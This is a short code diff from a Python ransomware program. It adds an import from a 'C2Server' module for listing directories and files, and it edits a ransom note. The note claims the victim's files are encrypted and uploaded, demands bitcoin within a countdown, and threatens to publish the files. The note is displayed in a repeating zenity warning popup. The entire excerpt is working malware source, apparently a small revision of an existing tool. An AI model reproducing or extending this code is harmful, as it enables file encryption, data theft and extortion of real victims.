@@ -4,6 +4,7 @@ from cryptography.fernet import Fernet
 import subprocess
 import time
 import signal
+from C2Server import list_safe_directories, get_files_in_dir
 
 # Home directory
 home = expanduser("~")
@@ -136,7 +137,7 @@ def main(duration):
             seconds = int(remaining_time % 60)
 
             # Text to be displayed on the pop up
-            text = f"HAHAHAHA, all your files are encrypted and stored on our sever!\nIf you pay us in the next <b>{hours:02d}:{minutes:02d}:{seconds:02d}</b> we will decrypt your files and delete our copy.\nIf you do not pay us, the files will be published to the internet for all to see. \nTransfer: xxx btc to wallet_id"
+            text = f"HAHAHAHA, all your files are encrypted and stored on our server!\n If you pay us in the next <b>{hours:02d}:{minutes:02d}:{seconds:02d}</b> we will decrypt your files and delete our copy.\n If you do not pay us, the files will be published to the internet for all to see. \nTransfer: xxx btc to wallet_id"
 
             # Show the dialog with the remaining time, keep refreshing the window.
             popup = subprocess.Popen(["zenity", "--warning", "--text", text,"--width", "400", "--height", "200" ])
